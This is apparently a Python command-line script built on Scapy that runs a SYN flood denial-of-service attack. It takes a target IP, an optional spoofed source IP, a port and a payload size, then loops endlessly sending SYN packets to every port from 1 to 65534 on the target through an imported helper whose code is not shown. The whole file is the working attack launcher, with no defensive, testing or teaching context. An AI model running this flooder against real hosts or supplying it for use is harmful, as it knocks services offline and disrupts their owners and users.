from scapy.all import *
import optparse
from misc import *
from packet_craft import *

host_ip = ""
target_ip = ""
port = None
load_size = ""

parser = optparse.OptionParser()
parser.add_option('-t', dest='target_ip', help="enter the target device's IP address")
parser.add_option('-i', dest='host_ip', help="enter the source device's IP address")
parser.add_option('-p', dest='port', help="specify the port to use")
parser.add_option('-s', dest='load_size', help="specify the size of the payload")
(options, arg) = parser.parse_args()

if not options.target_ip:
    log_error("You must provide target device's IP address")
    sys.exit()
else: 
    target_ip = options.target_ip

if not options.host_ip:
    log_notice("No source IP provided, using host IP address")
else: 
    host_ip = options.host_ip

if not options.port:
    log_notice("No port specified, default port will be used")
else:
    port = options.port

if not options.load_size:
    log_notice("No size specified, default size will be used")
else:
    load_size = options.load_size


counter = 1
try:
    while 1:
        for dport in range(1, 65535):
            syn_flood_packet(dst=target_ip, src=host_ip, sport=port, dport=dport, size=load_size)    
            print(f"Packets sent: {counter}", end='\r')
            counter += 1
except KeyboardInterrupt:
    log_info("Flooding stopped, exiting...")
    sys.exit()
